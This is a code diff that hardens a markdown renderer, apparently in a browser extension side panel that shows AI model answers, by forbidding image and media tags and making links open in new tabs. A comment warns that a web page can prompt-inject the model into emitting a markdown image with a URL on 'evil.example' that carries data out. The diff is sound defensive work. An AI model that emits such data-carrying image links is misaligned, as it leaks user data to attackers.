@@ -10,6 +10,23 @@ import { marked } from 'marked';
 
 marked.setOptions({ gfm: true, breaks: false });
 
+/**
+ * Answers now come from a real model, and a page can try to steer a model
+ * (prompt injection). Two consequences for what we render:
+ * - Links open in a new tab. Followed in place, a link would navigate the
+ *   side panel itself away from the extension.
+ * - No remote media. `![](https://evil.example/?q=…)` would otherwise make
+ *   the panel fetch a URL of the model's choosing, carrying whatever it was
+ *   talked into putting there. Answers are text and KaTeX; nothing needs <img>.
+ */
+DOMPurify.addHook('afterSanitizeAttributes', (node) => {
+  if (node.tagName === 'A') {
+    node.setAttribute('target', '_blank');
+    node.setAttribute('rel', 'noopener noreferrer');
+  }
+});
+const FORBID_TAGS = ['img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'link', 'style', 'form', 'input', 'button'];
+
 const PLACEHOLDER = (i: number) => `\u0000MATH${i}\u0000`;
 
 export function renderMath(tex: string, display: boolean): string {
@@ -36,7 +53,7 @@ export function renderMarkdown(src: string): string {
   });
   let html = marked.parse(text, { async: false }) as string;
   html = html.replace(/\u0000MATH(\d+)\u0000/g, (_m, i: string) => math[Number(i)] ?? '');
-  return DOMPurify.sanitize(html, { USE_PROFILES: { html: true, mathMl: true, svg: true } });
+  return DOMPurify.sanitize(html, { USE_PROFILES: { html: true, mathMl: true, svg: true }, FORBID_TAGS });
 }
 
 export function escapeHtml(s: string): string {
